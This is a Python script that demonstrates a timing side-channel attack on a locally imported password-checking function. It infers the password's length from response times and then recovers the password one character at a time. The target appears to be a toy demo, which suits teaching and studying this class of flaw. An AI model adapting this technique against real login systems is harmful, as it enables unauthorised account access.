from passwordChecker import passwordChecker_func
import timeit
import random
import string
import time


allowed_chars = string.ascii_lowercase + " "

# function to generate a random string of size passed
def random_str(size):
    return ''.join(random.choices(allowed_chars, k=size))


# function to crack length of the password
def crackLength():

    myList = []

    # check for password length from 1 to 50
    for i in range(1 , 50):

        print("checking password length - {}".format(i))

        # bruteforce the passwordChecker_func 1000 times , repeating the test 10 times with a randomString generated by random_str
        i_time = timeit.repeat(stmt='passwordChecker_func(x)',
                               setup=f'x = random_str({i})',
                               globals=globals(),
                               number=1000,
                               repeat=10)

        # add the result to the list with the min time taken by the passwordChecker_func to respond to query
        myList.append([i , min(i_time)])

    myList = sorted(myList , key=lambda x : x[1])

    # return the length which took maximum time to respond as it will be the correct password length as it went for comparision
    return int(myList[-1][0])




# function to crack the password
def crackPassword(passwordLength):

    start = time.time()

    # init current string password as empty password with length = password length
    currentString = " " * passwordLength

    # loop until you crack the password
    while(True):

        # we need to change the char in current string one by one to fit the password
        for i in range(passwordLength):

            # change the ith char with the chars from allowed_chars set one by one
            for j in allowed_chars:

                myString = currentString[:i] + j + currentString[i+1:]

                # time the new changed current string
                myString_time = timeit.repeat(stmt='passwordChecker_func(x)',
                               setup=f'x = {myString!r}',
                               globals=globals(),
                               number=1000,
                               repeat=10)

                # take minimum time to eliminate the random process interfering with our timings error
                myString_time = min(myString_time)

                # time the old current string
                currentString_time = timeit.repeat(stmt='passwordChecker_func(x)',
                               setup=f'x = {currentString!r}',
                               globals=globals(),
                               number=1000,
                               repeat=10)

                # take minimum time to eliminate the random process interfering with our timings error
                currentString_time = min(currentString_time)

                # if the time taken by new string is more than the old current string , means the new password is more accurate
                if(myString_time > currentString_time):
                    currentString = myString
                    print(currentString)

                # if password is correct return it
                if(passwordChecker_func(currentString)):
                    print(currentString)

                    end = time.time()
                    timeTaken = end - start

                    return currentString , timeTaken










if __name__ == "__main__":

    passwordLength = crackLength()

    print("\n\n")

    print("password length is estimated to be {}".format(passwordLength))

    print("\nPress Enter To Continue to crack")

    input()

    result , timeTaken = crackPassword(passwordLength)

    print("\n\n")

    print("password = {} , length = {} , time taken to crack = {}".format(result , passwordLength , timeTaken))







